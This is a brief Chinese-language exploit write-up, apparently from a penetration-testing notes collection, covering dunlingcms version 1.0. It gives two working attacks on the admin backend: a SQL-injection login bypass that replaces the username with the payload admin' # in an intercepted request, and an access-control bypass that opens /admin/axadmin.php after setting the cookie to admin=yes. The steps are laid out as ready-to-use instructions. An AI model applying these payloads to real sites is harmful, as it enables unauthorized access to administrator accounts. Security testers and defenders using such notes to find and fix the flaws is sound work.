### dunlingcms（盾灵）

```
版本信息：1.0
```

#### 万能密码登录

随便输入账号密码抓包

![image-20221207170438278](images/image-20221207170438278.png)

把用户名改为

```
admin' #
```

![image-20221207170504632](images/image-20221207170504632.png)

成功登录到后台

![image-20221207170555952](images/image-20221207170555952.png)

#### 越权登录后台

访问后台页面

```
/admin/axadmin.php
```

然后将cookie改为admin=yes

成功越权进入后台

![image-20221207170842017](images/image-20221207170842017.png)